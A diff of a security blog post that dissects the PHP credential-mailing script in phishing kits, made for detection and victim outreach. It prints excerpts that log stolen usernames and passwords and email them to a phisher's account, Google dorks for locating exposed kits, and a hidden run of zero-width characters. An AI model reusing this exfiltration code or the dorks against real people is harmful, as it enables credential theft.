@@ -77,54 +77,54 @@
 <p>This chunk of code is the main interest of ActiveAntiPhish as it is what exfiltrates stolen user info. It commonly has four parts with another debug-like part that shows up occasionally.</p>
 <p>The first part gathers info about the user such as IP, country of origin, and User Agent string. An example of this section can be found here:</p>
 <pre style="background-color:#3b3228;">
-<span style="background-color:#3b3228;color:#d0c8c6;">$country = visitor_country();
-$ip = getenv(&quot;REMOTE_ADDR&quot;);
-$_SESSION[&#39;UserName&#39;] = $_POST[&#39;UserName&#39;];
-$port = getenv(&quot;REMOTE_PORT&quot;);
-$browser = $_SERVER[&#39;HTTP_USER_AGENT&#39;];
-$adddate=date(&quot;D M d, Y g:i a&quot;);
+<span style="color:#d0c8c6;">$country = visitor_country();
+</span><span style="color:#d0c8c6;">$ip = getenv(&quot;REMOTE_ADDR&quot;);
+</span><span style="color:#d0c8c6;">$_SESSION[&#39;UserName&#39;] = $_POST[&#39;UserName&#39;];
+</span><span style="color:#d0c8c6;">$port = getenv(&quot;REMOTE_PORT&quot;);
+</span><span style="color:#d0c8c6;">$browser = $_SERVER[&#39;HTTP_USER_AGENT&#39;];
+</span><span style="color:#d0c8c6;">$adddate=date(&quot;D M d, Y g:i a&quot;);
 </span></pre>
 <p><code>visitor_country()</code> in this case is a function that uses publicly available geolocation APIs to get the victim's country of origin.</p>
 <p>The second part creates the log, this compiles all of the gathered info including the stolen credentials into a multi-line PHP string. This log contains lots of identifiable strings and is usually what ActiveAntiPhish uses to identify the <em>mailer</em>. An example log section:</p>
 <pre style="background-color:#3b3228;">
-<span style="background-color:#3b3228;color:#d0c8c6;">$message .= &quot;-----------  ! +Citi LOGIN ! xDD+ !  -----------\n&quot;;
-$message .= &quot;-----------  ! +Account infoS+ !  -----------\n&quot;;
-$message .= &quot;Email Address        : &quot;.$_POST[&#39;username&#39;].&quot;\n&quot;;
-$message .= &quot;Password               : &quot;.$_POST[&#39;passwd&#39;].&quot;\n&quot;;
-$message .= &quot;IP Address             : &quot;.$ip.&quot;\n&quot;;
-$message .= &quot;-----------  ! +nJoY+ !  -----------\n&quot;;
+<span style="color:#d0c8c6;">$message .= &quot;-----------  ! +Citi LOGIN ! xDD+ !  -----------\n&quot;;
+</span><span style="color:#d0c8c6;">$message .= &quot;-----------  ! +Account infoS+ !  -----------\n&quot;;
+</span><span style="color:#d0c8c6;">$message .= &quot;Email Address        : &quot;.$_POST[&#39;username&#39;].&quot;\n&quot;;
+</span><span style="color:#d0c8c6;">$message .= &quot;Password               : &quot;.$_POST[&#39;passwd&#39;].&quot;\n&quot;;
+</span><span style="color:#d0c8c6;">$message .= &quot;IP Address             : &quot;.$ip.&quot;\n&quot;;
+</span><span style="color:#d0c8c6;">$message .= &quot;-----------  ! +nJoY+ !  -----------\n&quot;;
 </span></pre>
 <p>Phishers like to tag their logs for an unknown reason. These tags are very identifiable. The structure of dashes with tags in the middle is common among all <em>mailers</em>. The YARA rules currently in use by ActiveAntiPhish trigger on this format as well as unique tags.</p>
 <p>The third part is where the <em>mailer</em> gets its name. It composes the headers and addresses to send an email to a throwaway account that the phisher controls. It looks a little something like this:</p>
 <pre style="background-color:#3b3228;">
-<span style="background-color:#3b3228;color:#d0c8c6;">$send = &quot;REDACTED@gmail.com&quot;;
-$subject = &quot;Office365 logs xD $ip&quot;;
-$headers = &quot;From:  El Patr0n&lt;</span><span style="background-color:#3b3228;color:#cb6077;">xCoNsoLe</span><span style="background-color:#3b3228;color:#d0c8c6;">@REDACTED.com&gt;&quot;;
-$headers .= $_POST[&#39;eMailAdd&#39;].&quot;\n&quot;;
-$headers .= &quot;MIME-Version: 1.0\n&quot;;
-$arr=array($send, $IP);
-foreach ($arr as $send)
-mail($send,$subject,$message,$headers);
+<span style="color:#d0c8c6;">$send = &quot;REDACTED@gmail.com&quot;;
+</span><span style="color:#d0c8c6;">$subject = &quot;Office365 logs xD $ip&quot;;
+</span><span style="color:#d0c8c6;">$headers = &quot;From:  El Patr0n&lt;</span><span style="color:#cb6077;">xCoNsoLe</span><span style="color:#d0c8c6;">@REDACTED.com&gt;&quot;;
+</span><span style="color:#d0c8c6;">$headers .= $_POST[&#39;eMailAdd&#39;].&quot;\n&quot;;
+</span><span style="color:#d0c8c6;">$headers .= &quot;MIME-Version: 1.0\n&quot;;
+</span><span style="color:#d0c8c6;">$arr=array($send, $IP);
+</span><span style="color:#d0c8c6;">foreach ($arr as $send)
+</span><span style="color:#d0c8c6;">mail($send,$subject,$message,$headers);
 </span></pre>
 <p>As you can see there are a lot of unique strings here, in fact phishers seem to like 1337SpEaK. This makes it easy to detect.</p>
 <p>The fourth part is often the redirect. This is an attempt to make the phishing page look legit by either logging you into or forwarding you on to the homepage of the impersonated site:</p>
 <pre style="background-color:#3b3228;">
-<span style="background-color:#3b3228;color:#d0c8c6;">header(&quot;Location: https://login.microsoftonline.com/&quot;);
+<span style="color:#d0c8c6;">header(&quot;Location: https://login.microsoftonline.com/&quot;);
 </span></pre>
 <p>This part of the <em>mailer</em> is only helpful in identifying phishkits when used in conjunction with the above indicators.</p>
 <p>The fifth and optional part is usually used to debug the mailer or is used as a fallback in case the throwaway account gets banned. It creates a local file and writes the log that would have been sent via email to the file. Phishkits that do this help us better understand who is being targeted as usually the log files are publicly readable. This allows me to contact those affected, especially those who had their corporate or university email stolen. The fallback option looks something like this:</p>
 <pre style="background-color:#3b3228;">
-<span style="background-color:#3b3228;color:#d0c8c6;">$handle = fopen(&quot;script.txt&quot;, &quot;a&quot;);
-fwrite($handle, $message);
-fclose($handle);
+<span style="color:#d0c8c6;">$handle = fopen(&quot;script.txt&quot;, &quot;a&quot;);
+</span><span style="color:#d0c8c6;">fwrite($handle, $message);
+</span><span style="color:#d0c8c6;">fclose($handle);
 </span></pre><h3>PhishKit Collection</h3>
 <p>The method I use for gathering phishkits is usually a list of Google dorks. <a href="https://phishtank.com/">PhishTank</a> is a good source if you're willing to hunt. Things to look for when hunting for phishkits are open directories with odd file and folder names. For example, here is a Google dork for Microsoft phishkits:</p>
 <pre style="background-color:#3b3228;">
-<span style="background-color:#3b3228;color:#d0c8c6;">intitle:&quot;Index of&quot; insite:&quot;onedrive&quot; &quot;.zip&quot;
+<span style="color:#d0c8c6;">intitle:&quot;Index of&quot; insite:&quot;onedrive&quot; &quot;.zip&quot;
 </span></pre>
 <p>Once you find one you can continue to find more by using filenames you find to be common. Another common Microsoft phishkit dork:</p>
 <pre style="background-color:#3b3228;">
-<span style="background-color:#3b3228;color:#d0c8c6;">intitle:&quot;Index of&quot; insite:&quot;m1cr0&quot; &quot;.zip&quot;
+<span style="color:#d0c8c6;">intitle:&quot;Index of&quot; insite:&quot;m1cr0&quot; &quot;.zip&quot;
 </span></pre>
 <p>These dorks work because of the way phishers​﻿﻿﻿﻿﻿​﻿﻿﻿​﻿​﻿​​﻿﻿​​﻿﻿​​﻿​​​﻿﻿​﻿​﻿﻿﻿​​﻿​​﻿﻿​﻿﻿​​﻿﻿​﻿​﻿​﻿﻿﻿​​​​​﻿​﻿​​​﻿​﻿​​﻿​﻿​﻿﻿﻿﻿​​﻿​​​﻿​​​﻿﻿​﻿ exploit vulnerable web servers. Often times a phisher finds a way of uploading a PHP webshell, this can be through poorly implemented upload pages or exploits (looking at you revslider). They then use the webshell to upload a zip file of the phishkit. They later extract the zip file and their kit is ready to go. Most phishers forget to delete the zip file after they're done. This allows us to download a copy of their phishkit. We now know how to interact with their <em>mailer</em> script which allows us to automate saturation of the phisher's email account.</p>
 <h3>Saturation</h3>
